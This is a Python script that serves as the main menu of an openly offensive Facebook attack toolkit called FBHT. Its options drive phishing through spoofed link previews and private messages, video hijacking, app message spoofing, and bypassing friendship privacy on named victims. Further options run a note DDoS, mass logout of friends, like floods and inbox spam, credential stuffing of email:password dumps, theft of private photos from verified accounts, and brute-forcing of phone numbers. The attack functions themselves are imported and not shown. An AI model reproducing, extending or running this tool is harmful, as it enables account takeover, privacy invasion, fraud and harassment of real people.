from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, devTest, getTest, changePassword,massMessage, massLoginTest, plotDOT, dotFileDatabase, simpleDotGraphDatabase, friendlyLogout, takePhotos,accountexists, checkLogin,steal, bruteforceCel
from database import connect,status, checkTableExistence, createVictimTable
from time import time
import signal
from handlers import *
from sys import stdin
import os

globalLogin = False
globalEmail = ''
globalPassword = ''

privacy = {'0':'80','1':'40','2':'10'}
privacySet = ['0','1','2']

def main():

    global globalLogin
    global globalEmail
    global globalPassword

    print '                       \n \n \n \n \n \n          '
    print '                    ______ ____  _    _ _______   '
    print '                   |  ____|  _ \| |  | |__   __|  '
    print '                   | |__  | |_) | |__| |  | |     '
    print '                   |  __| |  _ <|  __  |  | |     '
    print '                   | |    | |_) | |  | |  | |     '
    print '                   |_|    |____/|_|  |_|  |_|     '
    print '                             ____   ___           '
    print '                            |___ \ / _ \          '
    print '                       __   ____) | | | |         '
    print '                       \ \ / /__ <| | | |         '
    print '                        \ V /___) | |_| |         '
    print '                         \_/|____(_)___/          '
    
    print '               _     _                                             '
    print '    ____      | |   (_)                                            '
    print '   / __ \  ___| |__  _ _ __   ___   ___   __ _  __ ___      ____ _ '
    print '  / / _` |/ __| \'_ \| | \'_ \ / _ \ / _ \ / _` |/ _` \ \ /\ / / _` |'
    print ' | | (_| | (__| | | | | | | | (_) | (_) | (_| | (_| |\ V  V | (_| |'
    print '  \ \__,_|\___|_| |_|_|_| |_|\___/ \___/ \__, |\__,_| \_/\_/ \__,_|'
    print '   \____/                                 __/ |                    '
    print '                                         |___/                     '
    print '\n\n\n\n\n\n'	

    raw_input('Enjoy it :D . Press enter to get started')

    while 1:
        option = -1
        while ((int(option) != 1)  and (int(option) != 2)  and 
               (int(option) != 3)  and (int(option) != 4)  and 
               (int(option) != 5)  and (int(option) != 6)  and 
               (int(option) != 7)  and (int(option) != 8)  and 
               (int(option) != 9)  and (int(option) != 10) and
               (int(option) != 11) and (int(option) != 12) and
               (int(option) != 13) and (int(option) != 14) and 
               (int(option) != 15) and (int(option) != 16) and 
               (int(option) != 17) and (int(option) != 18) and
               (int(option) != 19) and (int(option) != 20) and
               (int(option) != 21) and (int(option) != 22) and 
               (int(option) != 23) and (int(option) != 24) and
               (int(option) != 25) and (int(option) != 26) and
               (int(option) != 27) and (int(option) != 28) and
               (int(option) != 29) and (int(option) != 30) and
               (int(option) != 31) and (int(option) != 32) and
               (int(option) != 33)):
                        
            print '\n'
            print '1)  Create accounts\n'
            print '2)  Delete all accounts for a given user\n'
            print '3)  Send friendship requests (Test Accounts)\n'
            print '4)  Accept friendship requests (Test Accounts)\n'
            print '5)  Connect all the accounts of the database\n'
            print '6)  Link Preview hack (Simple web version)\n'
            print '7)  Link Preview hack (Youtube version)\n'
            print '8)  Youtube hijack\n'
            print '9)  Private message, Link Preview hack (Simple web version)\n'
            print '10) Private message, Link Preview hack (Youtube version)\n'
            print '11) NEW Like flood\n'
            print '12) Publish a post as an App (App Message Spoof)\n'
            print '13) Bypass friendship privacy\n'
            print '14) Bypass friendship privacy with graph support\n'
            print '15) Analyze an existing graph\n'
            print '16) Link to disclosed friendships\n'
            print '17) Print database status\n'
            print '18) Increase logging level globally\n'
            print '19) Set global login (Credentials stored in memory - Danger)\n'
            print '20) Print dead attacks :\'( \n'
            print '21) Send friend request to disclosed friend list from your account\n'
            print '22) Bypass friendship (only .dot without graph integration)\n'
            print '23) Note DDoS attack\n'
            print '24) Old Like Flood (Not working)\n'
            print '25) NEW! SPAM any fanpage inbox\n'
            print '26) Bypass - database support (Beta) \n '
            print '27) Logout all your friends - FB blackout \n'
            print '28) Take the photos!\n'
            print '29) Check existence of mails\n'
            print '30) Check working account and passwords\n'
            print '31) Steal private photos from password verified dump\n'
            print '32) Bruteforce celphones\n'
            print '33) Close the application\n'

            
            choice = raw_input('Insert your choice: ')
            
            try:
                option = int(choice)
            except:
                raw_input('Not a digit, try again .. \n')
            print '\n\n'
        
        
        if(int(option) == 1):
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            
            appID = raw_input('Enter Application ID: ')
            
            if (login(email,password,'real'))!= -1:
                number = raw_input('Insert the amount of accounts for creation (4 min): ')
                for i in range(int(number)/4):
                    sTime = time()
                    devTest(appID)
                getTest(appID)
               
    
        if(int(option) == 2):
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
                
            if (login(email,password,'real'))!= -1:
                deleteUser()
                deleteAccounts()
                sTime = time()
                raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue: ')
                
            
        if(int(option) == 3):
            sTime = time()
            massLogin()
            friendshipRequest()
            raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')
            
            
        if(int(option) == 4):
            sTime = time()
            massLogin()
            acceptRequest()
            raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')
            
        if(int(option) == 5):
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
                
            if (login(email,password,'real'))!= -1:
                sTime = time()
                massLoginTest()
                raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')

        if (int(option) == 6):
            
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            
            if (login(email,password,'real'))!= -1:
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:  
                    summary = raw_input('Insert a summary for the link: ')
                    link = raw_input('Insert de evil link: ')
                    realLink = raw_input('Insert de real link: ')
                    title = raw_input('Insert a title for the link: ')
                    image = raw_input('Insert the image url for the post: ')
                    comment = raw_input('Insert a comment for the post associated: ')
                    linkPreview(link,realLink,title,summary,comment,image, privacy[option])
                else:
                    print "Wrong privacy value, try again "                
            
        
        if (int(option) == 7):
            
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            
            if (login(email,password,'real'))!= -1:
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:
                    summary = raw_input('Insert a summary for the video: ')
                    link = raw_input('Insert de evil link: ')
                    videoLink = raw_input('Insert de youtube link: ')
                    title = raw_input('Insert a title for the video: ')
                    videoID = raw_input('Insert the video ID (w?=): ')
                    comment = raw_input('Insert a comment for the post associated to the video: ')
                    linkPreviewYoutube(link,videoLink,title,summary,comment,videoID,privacy[option])
                else:
                    print "Wrong privacy value, try again " 
        
        if (int(option) == 8):
            signal.signal(signal.SIGINT, signal_handler)

            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:
                    summary = raw_input('Insert a summary for the video: ')
                    videoLink = raw_input('Insert de youtube link: ')
                    title = raw_input('Insert a title for the video: ')
                    videoID = raw_input('Insert the video ID (watch?v=): ')
                    comment = raw_input('Insert a comment for the post associated to the video: ')
                    hijackedVideo = raw_input('Insert the ID for the hijacked video (watch?v=): ')
                    hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy[option])
                else:
                    print "Wrong privacy value, try again "

        if (int(option) == 9):
            signal.signal(signal.SIGINT, signal_handler)

            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victims user ID: ')
                realLink = raw_input('Insert the real link: ')
                title = raw_input('Insert a title for the link: ')
                subject = raw_input('Insert the subject: ')
                summary = raw_input('Insert a summary for the link: ')
                message = raw_input('Insert the body of the message: ')            
                evilLink = raw_input('Insert the evil link: ')
                imageLink = raw_input('Insert the image associated to the post: ')
                privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,evilLink)        
        
        if (int(option) == 10):
            signal.signal(signal.SIGINT, signal_handler)

            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victimId = raw_input('Insert the victims user ID: ')
                subject = raw_input('Insert the subject: ')
                message = raw_input('Insert the message: ')
                title = raw_input('Insert a title for the video: ')
                summary = raw_input('Insert a summary for the video: ')
                videoLink = raw_input('Insert de youtube link: ')
                evilLink = raw_input('Insert the evil link (For hijacking insert same link as above): ')
                videoID = raw_input('Insert the video ID (watch?v=): ')
                hijackedVideo = raw_input('Insert the ID for the hijacked video (watch?v=) - For Non-Hijackig press enter: ')          
                privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,summary,videoID,hijackedVideo)
        
        
        if (int(option) == 11):
            signal.signal(signal.SIGINT, signal_handler)
            try:
                counter = 0
                postId = []
                
                print "Insert the Post ID's (Must be from a page). If no more posts for adding,insert '0' :"
                while True:
                    response = raw_input('post[%d]:'%counter)
                    if ( response is not '0' ):
                        counter+=1
                        postId.append(response)
                    else:
                        break
                        
                likeDev(postId)
            except EOFError:
                print 'EOFError'
                stdin.flush()
                pass
            except signalCaught as e:
                print ' %s' %e.args[0]  

                    
        
        if (int(option) == 12):
            
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword            
            
            if (login(email,password,'real'))!= -1:
                appId = raw_input('Insert a valid AppId: ')
                link = raw_input('Insert de evil link: ')
                picture = raw_input('Insert a link to a picture for the post: ')
                title = raw_input('Insert a title for the post: ')
                domain = raw_input('Insert a domain for the post: ')
                description = raw_input('Insert a description for the post: ')
                comment = raw_input('Insert a comment for the post: ')
                appMessageSpoof(appId,link,picture,title,domain,description,comment)
            
            
        if (int(option) == 13):
            signal.signal(signal.SIGINT, signal_handler)

            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                transitive = raw_input('Insert the transitive username or userId: ')
                
                print "The information will be stored in %s. \n" % os.path.join("dumps",victim+".txt")
                bypassFriendshipPrivacy(victim, transitive)
        
        if (int(option) == 14):
            signal.signal(signal.SIGINT, signal_handler)

            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                check = checkPrivacy(victim)
                if (check == -1):
                    transitive = raw_input('Insert the transitive username or userId: ')
                    print 'The information will be stored in %s \n' % os.path.join("dumps",victim,victim+".txt")
                    bypassFriendshipPrivacyPlot(victim, transitive)
                else:
                    friendList, friendsName = friendshipPlot(check,victim)
                    simpleGraph(friendList, victim)
                    print 'Friends available public ;D'

        
        if (int(option) == 15):
            
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            
            if (login(email,password,'real'))!= -1:
                analize = int(raw_input('Analyze an existing one, or a new one? (0|1): '))
                victim = raw_input('Insert the victim username or userId: ')
                if (analize == 1):
                    analyzeGraph(victim)
                else:
                    reAnalyzeGraph(victim)
        
        if (int(option) == 16):
            fileName = raw_input('Insert the victim username: ')
            linkFriends(fileName)
            
        if (int(option) == 17):
            status()
            raw_input('Press enter to continue: ')
        
        if (int(option) == 18):
            print 'This will increase the execution time significantly'
            setGlobalLogginng()
        
        if (int(option) == 19):
            
            globalLogin = not globalLogin
            if (globalLogin):
                    globalEmail,globalPassword = setMail()
            else:
                globalEmail = ''
                globalPassword = ''
        
        if (int(option) == 20):
            print 'Mail bomber through test accounts'
            print 'Test accounts massive creation'
            print 'Blocked Test account login bypass'
            print 'We hope this tool to be useless in the future'
            raw_input('Press enter to continue: ')
        
        if (int(option) == 21):
            signal.signal(signal.SIGINT, signal_handler)
            warning = True
            while ( (warning is not '0') and (warning is not '1')):
                warning = raw_input('Your account could be blocked.. Continue? 0|1: ')

            
            if (warning == '1'):
                
                victim = raw_input('Insert the victim username (Bypass friends list first): ')
                
                if (globalLogin == False):
                    email,password = setMail()
                else:
                    email = globalEmail
                    password = globalPassword
    
                if (login(email,password,'real'))!= -1:
                    sendRequestToList(victim)
        

        if (int(option) == 22):
            signal.signal(signal.SIGINT, signal_handler)

            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                check = checkPrivacy(victim)
                if (check == -1):
                    transitive = raw_input('Insert the transitive username or userId: ')
                    print 'The information will be stored in %s \n' % os.path.join("dumps",victim,victim+".txt")
                    dotFile(victim, transitive)
                else:
                    print 'Friends publicly available ;D'
                    friendList, friendsName = friendshipPlot(check,victim)
                    simpleDotGraph(friendsName, victim)

        if (int(option) == 23):
            signal.signal(signal.SIGINT, signal_handler)
            print 'Facebook note DDoS attack, discovered by chr13: http://chr13.com/about-me/'
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
                imageURL = raw_input('Insert the image URL from the site attack: ')
                noteID = raw_input('Insert the note ID: ')
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:
                    noteDDoS(imageURL,noteID, privacy[option])
        

                    
        if (int(option) == 24):
            signal.signal(signal.SIGINT, signal_handler)
            try:
                counter = 0
                postId = []
                
                print 'Insert the Post ID\'s (Must be from a page). If no more posts for adding,insert \'0\' :'
                while True:
                    response = raw_input('post[%d]:'%counter)
                    if ( response is not '0' ):
                        counter+=1
                        postId.append(response)
                    else:
                        break
                
                quantity = raw_input('Insert the amount of likes: ')
                like(postId, quantity)
            except EOFError:
                print 'EOFError'
                stdin.flush()
                pass
            except signalCaught as e:
                print ' %s' %e.args[0]  
                raw_input('Press enter to continue..')
                
   
        if (int(option) == 25):
            page = raw_input('Insert the fan page name or id: ')
            message = raw_input('Insert the message to send: ')
            massMessage(page, message)

        if (int(option) == 26):
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword             
            if (login(email,password,'real'))!= -1:
                victim = raw_input('Insert the victim username or userId: ')
                if ( checkTableExistence(victim) != True):
                    if (createVictimTable(victim) != -1):
                        check = checkPrivacy(victim)
                        if (check == -1):
                            transitive = raw_input('Insert the transitive username or userId: ')
                            dotFileDatabase(victim, transitive)
                            plotDOT(victim)    
                        else:
                            print 'Friends publicly available ;D'
                            friendList, friendsName = friendshipPlot(check,victim)
                            simpleDotGraphDatabase(friendsName, victim)
                            plotDOT(victim)

        if (int(option) == 27):
            signal.signal(signal.SIGINT, signal_handler)
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
                noteID = raw_input('Insert the note ID: ')
                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
                if option in privacySet:
                    friendlyLogout(noteID, privacy[option])

        if (int(option) == 28):
            signal.signal(signal.SIGINT, signal_handler)
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword

            if (login(email,password,'real'))!= -1:
                threads = raw_input('Usage: insert the threads filename and place it in massive folder first: ')
                raw_input('Dumps will be stored in massive\\photos')
                takePhotos(threads)

        if (int(option) == 29):
            mailFile = raw_input('Insert the filename that contains the list of emails (place it in PRIVATE folder first): ')
            raw_input('Verified emails will be stored in PRIVATE --> existence --> verified.txt ')
            accountexists(mailFile)
            
        if (int(option) == 30):
            mailFile = raw_input('Insert the filename that contains the list of emails and passwords (place it in PRIVATE folder first) with email:password pattern: ')
            raw_input('Verified loggins will be stored in PRIVATE --> loggedin --> loggedin.txt ')
            checkLogin(mailFile)

        if (int(option) == 31):
            raw_input('You must first run option 30, if you didn\'t I will fail :D ')
            raw_input('Dumps will be stored in massive\\photos')
            steal()

        if (int(option) == 32):
            signal.signal(signal.SIGINT, signal_handler)
            if (globalLogin == False):
                email,password = setMail()
            else:
                email = globalEmail
                password = globalPassword
            if (login(email,password,'real'))!= -1:
                raw_input('Dumps will be stored in cellphones --> cellphones.txt')
                first = raw_input('Insert the zone code: ')
                start = raw_input('Insert the start number: ')
                end = raw_input('Insert the end number: ')
                bruteforceCel(first,start,end)  
            
        if (int(option) == 33):
            connect.close()          
            
            print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
            print ' _    _            _      _______ _            _____  _                  _   _  '
            print '| |  | |          | |    |__   __| |          |  __ \| |                | | | | '
            print '| |__| | __ _  ___| | __    | |  | |__   ___  | |__) | | __ _ _ __   ___| |_| | '
            print '|  __  |/ _` |/ __| |/ /    | |  |  _ \ / _ \ |  ___/| |/ _` |  _ \ / _ \ __| | '
            print '| |  | | (_| | (__|   <     | |  | | | |  __/ | |    | | (_| | | | |  __/ |_|_| '
            print '|_|  |_|\__,_|\___|_|\_\    |_|  |_| |_|\___| |_|    |_|\__,_|_| |_|\___|\__(_) '
            print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '

            exit(0)

        

    
main()